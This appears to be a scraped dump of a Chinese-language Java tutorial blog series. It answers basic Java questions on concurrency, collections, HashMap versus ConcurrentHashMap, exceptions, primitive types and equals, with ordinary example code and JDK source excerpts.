import java.util.concurrent.LinkedBlockingQueue; class MyQueue &#123; BlockingQueue&lt;Integer&gt; q; // 阻塞队列 int size; // 队列持有产品数（此例无用） final int MAX_SIZE = 5; // 队列最大容量 public MyQueue() &#123; q = new LinkedBlockingQueue&lt;&gt;(MAX_SIZE); &#125; /** * 生产产品 * * @param num * 产品号码 */ public void produce(int num) &#123; // 阻塞队列会自动阻塞，不需要处理 try &#123; q.put(num); System.out.println(\"produce \" + num); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; /** * 消费产品 */ public void comsume() &#123; // 阻塞队列会自动阻塞，不需要处理 try &#123; System.out.println(\"comsume \" + q.take()); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; class Producer extends Thread &#123; private MyQueue q; public Producer(MyQueue q) &#123; this.q = q; &#125; @Override public void run() &#123; for (int i = 0; i &lt; 10; i++) q.produce(i); &#125; &#125; class Consumer extends Thread &#123; private MyQueue q; public Consumer(MyQueue q) &#123; this.q = q; &#125; @Override public void run() &#123; for (int i = 0; i &lt; 10; i++) q.comsume(); &#125; &#125; public class Main &#123; public static void main(String[] args) &#123; MyQueue q = new MyQueue(); Producer producer = new Producer(q); Consumer consumer = new Consumer(q); producer.start(); consumer.start(); &#125; &#125; 第四种方法（PipedInputStream和PipedOutputStream）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596import java.io.PipedInputStream; import java.io.PipedOutputStream; class MyQueue &#123; int size; // 队列持有产品数（此例无用） final int MAX_SIZE = 5; // 队列最大容量 PipedInputStream pis; PipedOutputStream pos; public MyQueue() &#123; // 初始化流 pis = new PipedInputStream(MAX_SIZE); pos = new PipedOutputStream(); // 管道流建立连接 try &#123; pos.connect(pis); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** * 生产产品 * * @param num * 产品号码 */ public void produce(int num) &#123; // 管道流会自动阻塞，不需要处理 try &#123; // 输出写在前面，否则会有奇怪的事情发生～ System.out.println(\"produce \" + num); pos.write(num); pos.flush(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** * 消费产品 */ public void comsume() &#123; // 管道流会自动阻塞，不需要处理 try &#123; System.out.println(\"comsume \" + pis.read()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Override protected void finalize() throws Throwable &#123; pis.close(); pos.close(); super.finalize(); &#125; &#125; class Producer extends Thread &#123; private MyQueue q; public Producer(MyQueue q) &#123; this.q = q; &#125; @Override public void run() &#123; for (int i = 0; i &lt; 10; i++) q.produce(i); &#125; &#125; class Consumer extends Thread &#123; private MyQueue q; public Consumer(MyQueue q) &#123; this.q = q; &#125; @Override public void run() &#123; for (int i = 0; i &lt; 10; i++) q.comsume(); &#125; &#125; public class Main &#123; public static void main(String[] args) &#123; MyQueue q = new MyQueue(); Producer producer = new Producer(q); Consumer consumer = new Consumer(q); producer.start(); consumer.start(); &#125; &#125; 输出结果： ThreadLocal的设计理念与作用ThreadLocal即线程本地存储。防止线程在共享资源上产生冲突的一种方式是根除对变量的共享。ThreadLocal是一种自动化机制，可以为使用相同变量的每个不同的线程都创建不同的存储，ThreadLocal对象通常当做静态域存储，通过get和set方法来访问对象的内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import java.util.Random; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.TimeUnit; class Accessor implements Runnable &#123; private final int id; // 线程id public Accessor(int id) &#123; this.id = id; &#125; @Override public void run() &#123; while(!Thread.currentThread().isInterrupted()) &#123; ThreadLocalVariableHolder.increment(); System.out.println(this); Thread.yield(); &#125; &#125; @Override public String toString() &#123; return \"#\" + id + \" : \" + ThreadLocalVariableHolder.get(); &#125; &#125; public class ThreadLocalVariableHolder &#123; private static ThreadLocal&lt;Integer&gt; value = new ThreadLocal&lt;Integer&gt;() &#123; // 返回随机数作为初始值 protected Integer initialValue() &#123; return new Random().nextInt(10000); &#125; &#125;; /** * 为当前线程的value值加一 */ public static void increment() &#123; value.set(value.get() + 1); &#125; /** * 返回当前线程存储的value值 * @return */ public static int get() &#123; return value.get(); &#125; public static void main(String[] args) throws InterruptedException &#123; ExecutorService service = Executors.newCachedThreadPool(); // 开启5个线程 for (int i = 0; i &lt; 5; i++) service.execute(new Accessor(i)); // 所有线程运行3秒 TimeUnit.SECONDS.sleep(1); // 关闭所有线程 service.shutdownNow(); &#125; &#125; 运行部分结果如下： 在上面的例子中虽然多个线程都去调用了ThreadLocalVariableHolder的increment和get方法，但这两个方法都没有进行同步处理，这是因为ThreadLocal保证我们使用的时候不会出现竞争条件。从结果来看，每个线程都在单独操作自己的变量，每个单独的线程都被分配了自己的存储（即便只有一个ThreadLocalVariableHolder对象），线程之间并没有互相造成影响。对于多线程资源共享的问题，同步机制采用了“以时间换空间”的方式，而ThreadLocal采用了“以空间换时间”的方式。在ThreadLocal类中有一个Map，用于存储每一个线程的变量的副本。","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"关于一些基础的Java问题的解答（四）","slug":"关于一些基础的Java问题的解答（四）","date":"2016-03-18T01:19:17.000Z","updated":"2020-05-11T07:23:44.835Z","comments":true,"path":"2016/03/18/关于一些基础的Java问题的解答（四）/","link":"","permalink":"https://superxlcr.github.io/2016/03/18/关于一些基础的Java问题的解答（四）/","excerpt":"","text":"上一篇文章的传送门：关于一些基础的Java问题的解答（三） Java面向对象的三个特征与含义java中的面向对象的三大基本特征分别是：封装、继承、多态： 封装：把过程和数据包围起来，对数据的访问只能通过已定义的界面，主要是方便类的修改与拓展 继承：对象的一个新类可以从现有的类中派生，这个过程称为类继承。通常继承把共性放到父类，特性放到子类。继承性很好的解决了软件的可重用性问题 多态：指允许不同类的对象对同一消息作出响应，多态性语言具有灵活、抽象、行为共享、代码共享的优势，很好的解决了应用程序函数同名问题 Override和Overload的含义和区别Override即重写，也叫覆盖，即在子类中拥有与父类非private方法一模一样的方法（返回值，参数，方法名均相同，在Java SE5中引入了协变类型，协变类型允许覆盖的方法的返回值为原返回值的子类型），且子类方法的访问修饰权限不能少于父类，则对子类调用该方法时会调用子类方法代替父类方法。Overload即重载，是指在同一类中拥有多个方法名相同，参数不同（参数类型或个数），返回值可相同可不同的方法。调用方法时会根据传入参数选择合适方法。两者区别： Override描述子类与父类方法的关系，Overload描述同一个类中方法的关系 Override的方法必须完全相同，权限不少于父类，Overload方法名必须相同，参数必须不同，返回值可同可不同 Interface与abstract类的区别Interface即接口，接口可以有变量，但接口的变量均为public static final的编译期常量，接口中的方法均为public abstract的公开抽象方法，一个类可以实现多个接口。abstract类即抽象类，抽象类有关键字abstract修饰，抽象类不能实例化只能被继承。抽象类中一般含有抽象方法（为public或protected，private无法继承），其他方面与一般类区别不大。两者区别： 接口的变量为public static final的编译期常量，抽象类的变量没有限制 接口中的方法为public abstract的公开抽象方法，抽象类的抽象方法不为private即可，且允许有一般方法 一个类可以实现多个接口，一个类最多只能继承一个抽象类 Static class 与non static class的区别首先由于顶级类（top level class）是不能为静态的，因此此处讨论的是内部类（nested class）。静态内部类和非静态内部类的区别主要有以下几点： 静态内部类不需要持有指向外部类的引用，但非静态内部类需要持有对外部类的引用 静态内部类不能访问外部类的非静态成员，只能访问外部类的静态成员，而非静态内部类可以访问外部类所有成员 静态内部类与非静态内部类创建方法不同，一个非静态内部类不能脱离外部类实体被创建 创建静态内部类和非静态内部类的代码： 1234567891011121314public class Test &#123; public static void main(String[] args) &#123; // 创建静态内部类 Test.staticClass class1 = new Test.staticClass(); // 创建非静态内部类 // 不能通过编译！ // Test.noStaticClass class2 = new Test.noStaticClass(); // 正确创建非静态内部类方法 Test.noStaticClass class2 = new Test().new noStaticClass(); &#125; static class staticClass &#123;&#125;; class noStaticClass &#123;&#125;; &#125; java多态的实现原理多态，也叫作动态绑定、后期绑定或运行时绑定，指允许不同类的对象对同一消息作出响应。下面介绍一些和绑定相关的概念： 绑定：指的是将一个方法调用和一个方法主体关联起来的过程 前期绑定：在程序执行前进行绑定（一般由编译器和连接程序实现，C++默认为前期绑定） 后期绑定：也叫作动态绑定或运行时绑定，在程序运行时通过识别对象的类型，从而调用恰当的方法（Java除static和final方法外，其他均为后期绑定。C++通过virtual关键字实现虚函数，从而实现后期绑定） 来看一段Java代码： 1234567891011121314151617181920212223242526272829303132public class Test &#123; static class A &#123; public void sayHi() &#123; System.out.println(\"Hi, I am A\"); &#125; &#125; static class B extends A &#123; @Override public void sayHi() &#123; System.out.println(\"Hi, I am B\"); &#125; &#125; static class C extends A &#123; @Override public void sayHi() &#123; System.out.println(\"Hi, I am C\"); &#125; &#125; public static void saySomething(A a) &#123; a.sayHi(); &#125; public static void main(String[] args) &#123; saySomething(new A()); saySomething(new B()); saySomething(new C()); &#125; &#125; 看到第23行的方法，从编译器给出的信息我们只能知道a是一个A类的引用，但无法确定a是A类的实例，还是其子类（B或C）的实例（导出类可以通过向上转型，把对自身的引用视为对其基类的引用），因此如果通过前期绑定，我们并不能实现多态。但是如果我们使用的是后期绑定，我们就可以在程序运行时先确定传入实例的具体类型，再根据其具体类型来调用对应的方法，就可以实现多态。","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"关于一些基础的Java问题的解答（三）","slug":"关于一些基础的Java问题的解答（三）","date":"2016-03-17T02:38:44.000Z","updated":"2020-05-11T07:23:44.829Z","comments":true,"path":"2016/03/17/关于一些基础的Java问题的解答（三）/","link":"","permalink":"https://superxlcr.github.io/2016/03/17/关于一些基础的Java问题的解答（三）/","excerpt":"","text":"上一篇文章的传送门：关于一些基础的Java问题的解答（二） HashMap和ConcurrentHashMap的区别从JDK1.2起，就有了HashMap，正如上一个问题所提到的，HashMap与HashTable不同，不是线程安全的，因此多线程操作时需要格外小心。在JDK1.5中，伟大的Doug Lea给我们带来了concurrent包，从此我们有线程安全的ConcurrentHashMap用了。那么ConcurrentHashMap是怎么实现线程安全的呢？肯定不可能是每个方法都加上synchronized关键字，否则就和HashTable一样了，我们来看看ConcurrentHashMap的put方法： 123public V put(K key, V value) &#123; return putVal(key, value, false); &#125; 调用了putVal方法，我们继续看看putVal方法的源码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263final V putVal(K key, V value, boolean onlyIfAbsent) &#123; if (key == null || value == null) throw new NullPointerException(); int hash = spread(key.hashCode()); int binCount = 0; for (Node&lt;K,V&gt;[] tab = table;;) &#123; Node&lt;K,V&gt; f; int n, i, fh; if (tab == null || (n = tab.length) == 0) tab = initTable(); else if ((f = tabAt(tab, i = (n - 1) &amp; hash)) == null) &#123; if (casTabAt(tab, i, null, new Node&lt;K,V&gt;(hash, key, value, null))) break; // no lock when adding to empty bin &#125; else if ((fh = f.hash) == MOVED) tab = helpTransfer(tab, f); else &#123; V oldVal = null; synchronized (f) &#123; if (tabAt(tab, i) == f) &#123; if (fh &gt;= 0) &#123; binCount = 1; for (Node&lt;K,V&gt; e = f;; ++binCount) &#123; K ek; if (e.hash == hash &amp;&amp; ((ek = e.key) == key || (ek != null &amp;&amp; key.equals(ek)))) &#123; oldVal = e.val; if (!onlyIfAbsent) e.val = value; break; &#125; Node&lt;K,V&gt; pred = e; if ((e = e.next) == null) &#123; pred.next = new Node&lt;K,V&gt;(hash, key, value, null); break; &#125; &#125; &#125; else if (f instanceof TreeBin) &#123; Node&lt;K,V&gt; p; binCount = 2; if ((p = ((TreeBin&lt;K,V&gt;)f).putTreeVal(hash, key, value)) != null) &#123; oldVal = p.val; if (!onlyIfAbsent) p.val = value; &#125; &#125; &#125; &#125; if (binCount != 0) &#123; if (binCount &gt;= TREEIFY_THRESHOLD) treeifyBin(tab, i); if (oldVal != null) return oldVal; break; &#125; &#125; &#125; addCount(1L, binCount); return null; &#125; 来看一些关键的代码：在第2行，方法检测了key和value是否为空，如果为空则抛出NullPointerException（看来线程安全的key和value都必须非空，和HashTable一样）。然后在第9行构造了一个Node对象，这个对象代表的是键值对节点（内部有next指针指向下一个节点）的实体。在ConcurrentHashMap内部维护了一个Node对象的数组，它大小是2的指数，且是volatile的具有原子可见性，数组索引是key经过哈希函数得出的哈希值： 12345/** * The array of bins. Lazily initialized upon first insertion. * Size is always a power of two. Accessed directly by iterators. */ transient volatile Node&lt;K,V&gt;[] table; 看回putVal方法，从第12行的注释我们可以看出，如果是往一个空的索引位置放入一个新的Node节点，则不需要加锁。再看到方法第18行，我们发现这里有个临界区，此时处理的是往一个已有节点的索引位置加入新的节点情况，那么在链表完成之前很明显我们不应该让其他新节点干扰我们的工作，因此此处为索引头的Node对象加了锁，但此时别的索引位置是不加锁的。看完了put方法，我们再来看看get方法： 12345678910111213141516171819public V get(Object key) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; e, p; int n, eh; K ek; int h = spread(key.hashCode()); if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (e = tabAt(tab, (n - 1) &amp; h)) != null) &#123; if ((eh = e.hash) == h) &#123; if ((ek = e.key) == key || (ek != null &amp;&amp; key.equals(ek))) return e.val; &#125; else if (eh &lt; 0) return (p = e.find(h, key)) != null ? p.val : null; while ((e = e.next) != null) &#123; if (e.hash == h &amp;&amp; ((ek = e.key) == key || (ek != null &amp;&amp; key.equals(ek)))) return e.val; &#125; &#125; return null; &#125; 可以看到由于volatile关键字保证了原子可见性，get方法是完全没有加锁的。对于remove方法和put方法类似，都是为要操作的索引头Node对象加锁构造临界区，此处不再贴出代码赘述。 综上所述，HashMap和ConcurrentHashMap区别如下： HashMap允许key和value为空值，ConcurrentHashMap不允许 HashMap的put和remove不加锁，不是线程安全的，而ConcurrentHashMap加锁，是线程安全的 两者的get方法都没有加锁，但HashMap的Node数组不具有volatile关键字 补充：本人的JDK版本为1.7，网上找的大部分资料都介绍ConcurrentHashMap使用了分段锁，但从源码来看这种方法在1.7貌似已经弃用了（put方法不一样了）： 123456789/** * Stripped-down version of helper class used in previous version, * declared for the sake of serialization compatibility */ static class Segment&lt;K,V&gt; extends ReentrantLock implements Serializable &#123; private static final long serialVersionUID = 2249069246763182397L; final float loadFactor; Segment(float lf) &#123; this.loadFactor = lf; &#125; &#125; TreeMap、HashMap、LinkedHashMap的区别HashMap就不说了，一个最常用的Map，前面几个问题都提及了。 LinkedHashMapLinkedHashMap是HashMap的子类，其类的声明如下： 123public class LinkedHashMap&lt;K,V&gt; extends HashMap&lt;K,V&gt; implements Map&lt;K,V&gt; 其与HashMap最大的不同在于内部维护了一个用于遍历的双向链表，遍历的时候能够保持元素插入的顺序： 123456789/** * The head (eldest) of the doubly linked list. */ transient LinkedHashMap.Entry&lt;K,V&gt; head; /** * The tail (youngest) of the doubly linked list. */ transient LinkedHashMap.Entry&lt;K,V&gt; tail; TreeMapTreeMap内部使用红黑树实现，因此插入TreeMap内部的元素遍历时是有序的： 123456789/** * The comparator used to maintain order in this tree map, or * null if it uses the natural ordering of its keys. * * @serial */ private final Comparator&lt;? super K&gt; comparator; private transient Entry&lt;K,V&gt; root; Collection包结构，与Collections的区别Collection即Java中的容器类，其包结构如下所示： Collection可以看到Java容器中有Collection和Map两种类型，Collection表示元素的集合，Map表示键值对映射的集合，Map中也包含了Collection（key的集合，value的集合以及键值对的集合），而Collection又可以返回Iterator（迭代器）用于容器的遍历和访问。Collection下又细分为多种特点不同的容器，主要有： 按元素插入顺序存储的List 不允许元素重复的Set 先进先出的Queue 后进先出的Stack 每种容器又有对应的更细节的实现。一般我们创造新容器时不需要继承Collection类，继承Collection子类下的容器抽象类即可。 Collections除了Collection类以外，可以看到图的右下角还有两个工具类，分别是Collections和Arrays。两个类的构造方法均为private，即不允许新建该类的实例，同时两个类包含了大量的静态方法用于处理我们的存储结构（排序，二分查找，填充等操作）。其中，Collections用于处理Collection容器类的存储结构，而Arrays则用于处理基本类型组成的数组。 try catch finally，try里有return，finally还执行么？执行，无论发生啥情况，try后面的finally中的代码块必定会执行，示例： 1234567891011121314 public class Test &#123; public static void main(String[] args) &#123; try &#123; System.out.println(\"try\"); return; &#125; catch (Exception e) &#123; &#125; finally &#123; System.out.println(\"finally\"); &#125; &#125; &#125; 结果输出为： 12tryfinally Excption与Error包结构，OOM遇到的情况Java中有关于异常类的结构图如下： 在Java中，异常的根类是java.lang.Throwable类，而根类又分为两大类：Error和Exception： Error是无法处理的异常，比如OutOfMemoryError，一般发生这种异常，JVM会选择终止程序。因此我们编写程序时不需要关心这类异常。 Exception，也就是我们经常见到的一些异常情况，比如NullPointerException、IndexOutOfBoundsException，这些异常是我们可以处理的异常。 其中，Exception类又细分为checked exception和unchecked exception（也称RuntimeException运行时异常）对于unchecked exception（非检查异常），也称运行时异常（RuntimeException），比如常见的NullPointerException、IndexOutOfBoundsException，java编译器不要求必须进行异常捕获处理或者抛出声明，由程序员自行决定。（可以处理，也可以不处理）对于checked exception（检查异常），也称非运行时异常（运行时异常以外的异常就是非运行时异常），java编译器强制程序员必须进行捕获处理，比如常见的IOExeption和SQLException。对于非运行时异常如果不进行捕获或者抛出声明处理，编译都不会通过。 关于OOMOOM即out of memory，内存溢出，与JVM的运行时内存有关，当JVM内存不够时就会发生OOM，主要分一下几种情况： 堆溢出：堆是JVM存放对象实例的地方，如果我们产生的对象过多，JVM又没有及时的GC，就会突破最大堆容量限制从而发生OOM 操作栈或本地方法栈溢出：如果线程在拓展栈时无法申请到足够的内存，也会发生OOM，一般而言是递归出现了死循环 方法区溢出：方法区存储了JVM中的常量，静态变量和类信息等信息，一个类如果要被垃圾收集器回收，判定条件是很苛刻的，因此在经常动态生成加载大量Class也可能发生OOM","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"关于一些基础的Java问题的解答（二）","slug":"关于一些基础的Java问题的解答（二）","date":"2016-03-16T07:37:45.000Z","updated":"2020-05-11T07:23:44.830Z","comments":true,"path":"2016/03/16/关于一些基础的Java问题的解答（二）/","link":"","permalink":"https://superxlcr.github.io/2016/03/16/关于一些基础的Java问题的解答（二）/","excerpt":"","text":"上一篇文章的传送门：关于一些基础的Java问题的解答（一） Hashcode的作用官方对于hashCode的解释如下： Whenever it is invoked on the same object more than once during an execution of a Java application, the hashCode method must consistently return the same integer, provided no information used in equals comparisons on the object is modified. This integer need not remain consistent from one execution of an application to another execution of the same application. If two objects are equal according to the equals(Object) method, then calling the hashCode method on each of the two objects must produce the same integer result. It is not required that if two objects are unequal according to the equals(java.lang.Object) method, then calling the hashCode method on each of the two objects must produce distinct integer results. However, the programmer should be aware that producing distinct integer results for unequal objects may improve the performance of hash tables. 以上这段官方文档的定义，我们可以抽出成以下几个关键点： hashCode的存在主要是用于查找的快捷性，如Hashtable，HashMap等，hashCode是用来在散列存储结构中确定对象的存储地址的 两个equals（相同）的对象返回的hashCode是相同的 如果对象的equals方法被重写，那么对象的hashCode也尽量重写，避免违反第2点 两个不同的对象hashCode不一定不同，但如果他们的hashCode不同哈希表的性能会更好（减少冲突） ArrayList、LinkedList、Vector的区别先说说相同点：三者都实现了List接口 再来说说不同的地方： LinkedList额外实现了Queue接口 ArrayList和Vector底层是由数组实现，LinkedList底层是由双向链表实现 根据第2点，ArrayList和Vector具有更好的随机索引读取性能，LinkedList具有更好的插入删除元素性能 ArrayList和LinkedList不是线程安全的，Vector是线程安全的（关键方法都加了synchronized关键字），因此Vector在性能上不如前两者 String、StringBuffer与StringBuilder的区别StringString即字符串，底层由char数组实现，代码如下： 12/** The value is used for character storage. */ private final char value[]; 官方对String解释如下：Strings are constant; their values cannot be changed after they are created.综上我们可以得知String是不变的常量，String类中每一个看起来会修改String的方法，实际上都创建了一个全新的String对象。当我们为一个String变量赋值的时候，其实是新创建了一个String对象把地址赋给他。除此以外，值得注意的是String是一个final类，这意味着它不能被继承。 StringBuffer和StringBuilder由于String是常量，当我们处理长度变化的String时效率低下，因此官方提供了StringBuffer和StringBuilder两个类。两个类有共同的父类：AbstractStringBuilder，方法也差不多，底层也是由char数组存储数据的，但是StringBuffer是线程安全的（关键方法都加了synchronized关键字），而StringBuilder不是线程安全的，因此StringBuilder处理字符串的效率比较高。 Map、Set、List、Queue、Stack的特点与用法先上Java容器分类图（虚线框表示抽象类）： MapMap即映射表，里面保存的是一组成对的”键值对”对象，一个映射不能包含重复的键，每个键最多只能映射到一个值，我们可以通过”键”找到该键对应的”值”。 常用的Map的方法有： clear：移除Map中的所有元素 containsKey：判断Map中是否含有指定的“键” containsValue：判断Map中是否含有指定的“值” entrySet：返回Map中键值对的集合 get：通过“键”获取指定的“值” isEmpty：是否为空Map keySet：返回Map中“键”的集合 put：加入新的键值对，返回该键的旧值 remove：移除指定“键”的键值对，返回该键的值 size：Map含有的键值对数目 values：返回值的容器视图 常用的Map的实现类有： HashMap：哈希映射表，最常用的Map，使用了hashCode（散列码）优化的Map结构，不保证遍历顺序（例：先存入a后存入b，但遍历时可能先出现b再出现a） LinkedHashMap：HashMap的子类，但内部维护了一个双向链表，保证遍历顺序是插入顺序或基于LRU（最近最少使用）算法 WeakHashMap：使用弱引用实现的HashMap，当其中的某些键值对不再被使用时会被自动GC掉 HashTable：与HashMap大致上类似，但是是线程安全的 IdentityHashMap：使用==代替equals对“键”进行比较的HashMap TreeMap：基于红黑树实现的HashMap，查看“键”或“键值对”时，它们会被排序，另外可以使用subMap方法返回子树 SetSet即集合，里面保存的是一堆不可重复的元素，使用equals方法来确保对象的唯一性。 常用的Set的方法有： add：为Set加入新的元素，返回是否加入成功（存在则失败，反之则成功） clear：清除所有元素 contains：判断是否含有某元素 isEmpty：判断是否为空Set iterator：返回迭代器 remove：移除某元素 size：Set含有元素的数目 常用Set的实现类有： HashSet：为快速查找而设计的Set，存入的元素必须定义hashCode LinkedHashSet：具有HashSet的查询速度，且内部有链表维护元素顺序的Set TreeSet：保持排序的Set，底层为树结构 ListList即列表，与数组类似，按照元素插入的顺序保存元素。 常用的List的方法有： add：在最后或特定位置加入新的元素 clear：清除所有元素 contains：是否含有指定元素 get：获取特定索引元素 indexOf：返回特定元素第一次出现的索引，没有则返回-1 isEmpty：判断是否为空 iterator：返回迭代器 lastIndexOf：返回特定元素最后一次出现的索引，没有则返回-1 remove：移除特定元素 size：返回List大小 subList：根据传入的两个索引返回子列表 常用的List实现类有： ArrayList：擅长随机访问的列表 LinkedList：擅长插入和删除操作的列表 Vector：与ArrayList类似，线程安全的列表 QueueQueue即队列，是一个FIFO（先进先出）的容器。 常用的Queue方法有： add/offer：往队列中加入新元素 peek：返回队首元素 poll：返回并移除队首元素 isEmpty：队列是否为空 常用的Queue的实现类有： LinkedList：即普通的队列 PriorityQueue：一个由优先级堆实现的队列，队列中的元素是有序的 StackStack即栈，是一个LIFO（后进先出）的容器。 常用的Stack方法有： push：往栈中添加新元素 peek：返回栈顶元素 pop：返回并移除栈顶元素 isEmpty：栈是否为空 Stack的实现类即Stack。 HashMap和HashTable的区别HashMap和HashTable都实现了Map接口，他们功能也相当类似，两者的主要区别如下： HashMap继承自AbstractMap类，而HashTable继承自Dictionary类 HashMap不是线程安全的，HashTable是线程安全的（关键方法添加了synchronized关键字），因此HashTable效率相对较低 HashMap允许key和value为null，HashTable不允许key和value为null HashMap和HashTable类声明： 12public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable 123public class Hashtable&lt;K,V&gt; extends Dictionary&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, java.io.Serializable HashMap的put方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true); &#125; final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); else &#123; Node&lt;K,V&gt; e; K k; if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; else if (p instanceof TreeNode) e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); else &#123; for (int binCount = 0; ; ++binCount) &#123; if ((e = p.next) == null) &#123; p.next = newNode(hash, key, value, null); if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; &#125; if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; &#125; &#125; if (e != null) &#123; // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); return oldValue; &#125; &#125; ++modCount; if (++size &gt; threshold) resize(); afterNodeInsertion(evict); return null; &#125; 从上面代码我们可以看出对key和value并没有不能为null的限制。HashTable的put方法： 1234567891011121314151617181920212223public synchronized V put(K key, V value) &#123; // Make sure the value is not null if (value == null) &#123; throw new NullPointerException(); &#125; // Makes sure the key is not already in the hashtable. Entry&lt;?,?&gt; tab[] = table; int hash = key.hashCode(); int index = (hash &amp; 0x7FFFFFFF) % tab.length; @SuppressWarnings(\"unchecked\") Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index]; for(; entry != null ; entry = entry.next) &#123; if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123; V old = entry.value; entry.value = value; return old; &#125; &#125; addEntry(hash, key, value, index); return null; &#125; 这是一个同步的方法，我们看到第3行会判断value是否为null，如果为null则抛出NullPointer的异常。在第9行调用了key的hashCode方法，如果key对象为null，则会抛出NullPointer的异常。因此，插入HashTable的key和value均不能为null。","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"关于一些基础的Java问题的解答（一）","slug":"关于一些基础的Java问题的解答（一）","date":"2016-03-15T08:13:53.000Z","updated":"2020-05-11T07:23:44.827Z","comments":true,"path":"2016/03/15/关于一些基础的Java问题的解答（一）/","link":"","permalink":"https://superxlcr.github.io/2016/03/15/关于一些基础的Java问题的解答（一）/","excerpt":"","text":"学习一门语言基础是非常重要的，因此本文总结了一些常见的Java基础问题的解答，希望可以帮到大家。 九种基本数据类型的包装类及大小。9种基本数据类型： 基本类型 包装类型 大小 boolean Boolean - byte Byte 8bit short Short 16bit int Integer 32bit long Long 64bit float Float 32bit double Double 64bit char Character 16bit void Void - 上面有两个比较值得注意的地方：一个是boolean的大小并非是确定的，根据网上找来的JVM规范： 1234Instead, expressions in the Java programming language that operate on boolean values are compiled to use values of the Java virtual machine int data type. Where Java programming language boolean values are mapped by compilers to values of Java virtual machine type int, the compilers must use the same encoding. Java virtual machine type int, whose values are 32-bit signed two&apos;s-complement integers。Arrays of type boolean are accessed and modified using the byte array instructions In Sun&apos;s JDK releases 1.0 and 1.1, and the Java 2 SDK, Standard Edition, v1.2, boolean arrays in the Java programming language are encoded as Java virtual machine byte arrays, using 8 bits per boolean element. 从上文我们可以得知，boolean变量单独声明的时候被当做int变量处理，其大小为32bit，当boolean变量声明数组的时候，每个boolean当做byte变量处理，大小为8bit。 另一个是void也是Java的基本类型之一，其对应的包装类是不可实例化的，如下所示： 12345678910111213141516171819202122232425package java.lang; /** * The &#123;@code Void&#125; class is an uninstantiable placeholder class to hold a * reference to the &#123;@code Class&#125; object representing the Java keyword * void. * * @author unascribed * @since JDK1.1 */ public final class Void &#123; /** * The &#123;@code Class&#125; object representing the pseudo-type corresponding to * the keyword &#123;@code void&#125;. */ @SuppressWarnings(\"unchecked\") public static final Class&lt;Void&gt; TYPE = (Class&lt;Void&gt;) Class.getPrimitiveClass(\"void\"); /* * The Void class cannot be instantiated. */ private Void() &#123;&#125; &#125; switch的参数在Java中，switch后面的括号里放的参数类型只能是int类型，虽然说放入char，byte，short类型也不会报错，但其实是因为char，byte和short类型可以自己转化（宽化）为int类型，实际上最后操作的还是int类型。 原理：在Java的9种基本类型中，boolean和void类型不能进行转换。大小较小的类型向大小较大的类型转换叫宽化（如char转int），宽化会自动在变量前面补零且是安全的，因此可以自动转换。大小较大的类型向大小较小的类型转化叫窄化（如double转int），窄化不能自动转换，必须使用强制类型转换，如：（int）double。 补充：除了int类型外还支持枚举类型。另外在jdk1.7中有了新的特性，支持String类型。 equals与==的区别很经典的一个问题了。首先==在Java中，对于基本类型比较的是他们的值是否相等，对于引用类型则比较两个对象是否地址相同，是否为同一引用。equals在Object中的默认实现和==没有区别： 123public boolean equals(Object obj) &#123; return (this == obj); &#125; 值的注意的是用的较多的String类重写了equals方法： 123456789101112131415161718192021public boolean equals(Object anObject) &#123; if (this == anObject) &#123; return true; &#125; if (anObject instanceof String) &#123; String anotherString = (String)anObject; int n = value.length; if (n == anotherString.value.length) &#123; char v1[] = value; char v2[] = anotherString.value; int i = 0; while (n-- != 0) &#123; if (v1[i] != v2[i]) return false; i++; &#125; return true; &#125; &#125; return false; &#125; 